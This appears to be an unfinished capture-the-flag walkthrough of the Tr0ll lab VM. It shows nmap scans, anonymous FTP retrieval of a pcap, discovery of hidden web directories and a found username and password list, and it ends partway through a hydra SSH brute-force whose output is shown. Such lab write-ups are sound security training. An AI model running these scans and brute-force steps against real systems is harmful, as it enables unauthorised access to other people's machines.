# Tr0ll Walkthrough : Exploitation Guide

## Tr0ll :

## Intelligence Gathering

### Host Discovery 

```
nmap -sn 192.168.105.134
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 192.168.105.134
Host is up (0.00075s latency).
Nmap done: 1 IP address (1 host up) scanned in 0.01 seconds

```

### Service Scan

```
sudo nmap -sV -O -p- 192.168.105.134
Starting Nmap 7.94SVN ( https://nmap.org ) 
Nmap scan report for 192.168.105.134
Host is up (0.00080s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds

```

## Vulnerability Analysis

### Script Scan 

```
sudo nmap -sC -p- 192.168.105.134
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 192.168.105.134
Host is up (0.0017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.105.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-title: Site doesn't have a title (text/html).
MAC Address : (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds

```

### 80 http : Apache httpd 2.4.7

- URL : http://192.168.105.134/
    - Just an image

- URL : http://192.168.105.134/robots.txt
    - Disallowed entry to /secret folder
        ```
        User-agent:*
        Disallow: /secret
        ```
- URL : http://192.168.105.134/secret/
    - Just an image

- URL : http://192.168.105.134/sup3rs3cr3tdirlol/
    - Contains a file called "roflmao"
    - roflmao	2014-08-11 18:45 	7.1K	

- URL : http://192.168.105.134/0x0856BF/
    - It contains folders
    - good_luck/
        - which_one_lol.txt
    - this_folder_contains_the_password/
        - Pass.txt


### 21 ftp : vsftpd 3.0.2

- The result of NSE Script Scan shows that anonymous login is allowed on the ftp server.
- The ftp server contains a file **lol.pcap** which is accessible.
- .pcap file is a common format for storing captured network traffic, reffered as packet capture file
- Downloading lol.pcap file through ftp 
    ```
    ftp 192.168.105.134
    Connected to 192.168.105.134.
    220 (vsFTPd 3.0.2)
    Name (192.168.105.134:achilles): anonymous
    331 Please specify the password.
    Password: 
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    229 Entering Extended Passive Mode (|||64283|).
    150 Here comes the directory listing.
    -rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
    226 Directory send OK.
    ftp> get lol.pcap /home/achilles/lol.pcap
    local: /home/achilles/lol.pcap remote: lol.pcap
    229 Entering Extended Passive Mode (|||49965|).
    150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
    100% |***********************************|  8068        1.20 MiB/s    00:00 ETA
    226 Transfer complete.
    8068 bytes received in 00:00 (1.10 MiB/s)
    ftp> 



    ```

### lol.pcap file analysis

- In to network traffic logs on lol.pcap file, that says text file named secret_stuff.txt was pushed to the FTP server.
- **secret_stuff.txt** : 
    ```
    Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

    Sucks, you were so close... gotta TRY HARDER!
    ```
- The secret_stuff.txt file says "you almost found the sup3rs3cr3tdirlol"
- sup3rs3cr3tdirlol = supersecretdirlol
- supersecretdirlol indicates that sup3rs3cr3tdirlol could be a directory
- URL : http://192.168.105.134/sup3rs3cr3tdirlol/
    - Contains a file called "roflmao"
    - roflmao	2014-08-11 18:45 	7.1K	

### roflmao

- roflmao is a binary file.
    ```
    file roflmao
    roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter
    ```
    ```
    ./roflmao 
    Find address 0x0856BF to proceed
    ```
- After execution it says "Find address 0x0856BF to proceed"
- "0x0856BF" could be the URL path just like "sup3rs3cr3tdirlol" that was found in secret_stuff.txt
- URL : http://192.168.105.134/0x0856BF/
    - It contains folders

### 0x0856BF/

- URL : http://192.168.105.134/0x0856BF/
    - It contains folders
    - good_luck/
        - which_one_lol.txt
    - this_folder_contains_the_password/
        - Pass.txt
- which_one_lol.txt
    ```
    maleus
    ps-aux
    felux
    Eagle11
    genphlux < -- Definitely not this one
    usmc8892
    blawrg
    wytshadow
    vis1t0r
    overflow
    ```

- Pass.txt
    ```
    Good_job_:)
    ```
- Usernames and Password for the system 
- ftp is anonymous only and only other service is ssh so this might be for ssh login


## Exploitation

### 22 ssh : OpenSSH 6.6.1p1 (Brute Force Attack)

- Brute force attack on SSH service
- Using hydra for bruteforcing ssh service
    ```
    hydra -v -V -L users -P pass -e n -t 1 -w 30 ssh://192.168.105.134
    Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-24 21:21:45
    [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
    [DATA] max 1 task per 1 server, overall 1 task, 22 login tries (l:11/p:2), ~22 tries per task
    [DATA] attacking ssh://192.168.105.134:22/
    [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
    [INFO] Testing if password authentication is supported by ssh://maleus@192.168.105.134:22
    [INFO] Successful, password authentication is supported by ssh://192.168.105.134:22
    [ATTEMPT] target 192.168.105.134 - login "maleus" - pass "" - 1 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "maleus" - pass "Good_job_:)" - 2 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "ps-aux" - pass "" - 3 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "ps-aux" - pass "Good_job_:)" - 4 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "felux" - pass "" - 5 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "felux" - pass "Good_job_:)" - 6 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "Eagle11" - pass "" - 7 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "Eagle11" - pass "Good_job_:)" - 8 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "genphlux" - pass "" - 9 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "genphlux" - pass "Good_job_:)" - 10 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "usmc8892" - pass "" - 11 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "usmc8892" - pass "Good_job_:)" - 12 of 22 [child 0] (0/0)
    [ATTEMPT] target 192.168.105.134 - login "blawrg" - pass "" - 13 of 22 [child 0] (0/0)
    [ERROR] could not connect to target port 22: Connection refused
    [ERROR] ssh protocol error
    [VERBOSE] Retrying connection for child 0
    [RE-ATTEMPT] target 192.168.105.134 - login "blawrg" - pass "" - 13 of 22 [child 0] (0/0)
    [ERROR] could not connect to target port 22: Connection refused
    [ERROR] ssh protocol error
    [VERBOSE] Retrying connection for child 0
    ```
- The error occurred during testing password for user "blawrg"
- let's try bruteforcing remaining usernames
- 




















